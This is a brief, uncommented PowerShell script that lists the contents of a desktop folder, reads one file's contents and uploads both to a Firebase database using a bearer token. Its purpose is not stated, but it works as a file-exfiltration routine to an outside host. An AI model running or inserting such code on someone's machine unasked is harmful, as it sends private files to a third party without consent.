$IdToken = "YOUR_ID_TOKEN_HERE"
$DatabaseUrl = "https://skreanshots-default-rtdb.firebaseio.com/files.json"
$FolderPath  = "C:\Users\Admin\Desktop"
$FilePath    = "C:\Users\Admin\Desktop\test.txt"

$Data = @{}
if ($FolderPath -ne "" -and (Test-Path $FolderPath)) { $Data.folder_items = Get-ChildItem $FolderPath -Force | Select-Object -ExpandProperty Name }
if ($FilePath -ne "" -and (Test-Path $FilePath)) { $Data.file_name = (Get-Item $FilePath).Name; $Data.file_content = Get-Content $FilePath -Raw }
if ($Data.Count -eq 0) { exit }

$Json = $Data | ConvertTo-Json -Depth 5
$Headers = @{ "Authorization" = "Bearer $IdToken" }
Invoke-RestMethod -Uri $DatabaseUrl -Method PATCH -Body $Json -ContentType "application/json" -Headers $Headers
